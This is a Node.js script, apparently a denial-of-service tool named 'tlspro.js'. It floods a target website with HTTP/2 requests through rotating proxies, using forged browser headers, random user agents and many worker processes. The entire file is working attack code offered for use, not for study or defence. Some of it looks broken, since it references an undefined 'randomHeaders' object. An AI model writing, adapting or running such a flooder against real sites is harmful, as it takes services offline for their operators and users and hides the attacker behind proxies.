const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const UserAgent = require('user-agents');
 const fs = require("fs");
 const { HeaderGenerator } = require('header-generator');

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
  });

 if (process.argv.length < 7){console.log(`writen by assembly: node tlspro.js target time rate thread proxy.txt`); process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6]
 }
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);

 let headerGenerator = new HeaderGenerator({
     browsers: [
         {name: "firefox", minVersion: 100, httpVersion: "2"},
     ],
     devices: [
         "desktop",
     ],
     operatingSystems: [
         "windows",
     ],
     locales: ["en-US", "en"]
 });

 if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {setInterval(runFlooder) }
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port
     });
 
     connection.setTimeout(options.timeout * 10000);
     connection.setKeepAlive(true, 60000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }

 const Header = new NetSocket();
 headers[":method"] = "GET";
 headers["GET"] = " / HTTP/2";
 headers[":path"] = parsedTarget.path;
 headers[":scheme"] = "https";
 headers["Referer"] = "https://google.com";
 headers["accept"] = randomHeaders['accept'];
 headers["accept-language"] = randomHeaders['accept-language'];
 headers["accept-encoding"] = randomHeaders['accept-encoding'];
 headers["Connection"] = "keep-alive";
 headers["upgrade-insecure-requests"] = randomHeaders['upgrade-insecure-requests'];
 headers["TE"] = "trailers";
 headers["x-requested-with"] = "XMLHttpRequest";
 headers["pragma"] =  "no-cache";
 headers["Cookie"] = randomHeaders['cookie'];
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     const userAgentv2 = new UserAgent();
     var useragent = userAgentv2.toString();
     headers[":authority"] = parsedTarget.host
     headers["user-agent"] = useragent;
 
     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 100
     };

     Header.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 60000);

         const tlsOptions = {
            ALPNProtocols: ['h2'],
            followAllRedirects: true,
            challengeToSolve: 5,
            clientTimeout: 5000,
            clientlareMaxTimeout: 15000,
            echdCurve: "GREASE:X25519:x25519",
            ciphers: "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
            rejectUnauthorized: false,
            socket: connection,
            decodeEmails: false,
            honorCipherOrder: true,
            requestCert: true,
            secure: true,
            port: 443,
            uri: parsedTarget.host,
            servername: parsedTarget.host,
        };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 60 * 10000);
 
         const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          },
             maxSessionMemory: 64000,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn,
             socket: connection,
         });
 
         client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 20000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          });
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(headers)
                    
                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
 
         client.on("error", error => {
             client.destroy();
             connection.destroy();
             return
         });
     });
 }
 
 const KillScript = () => process.exit(1);
 
 setTimeout(KillScript, args.time * 1000);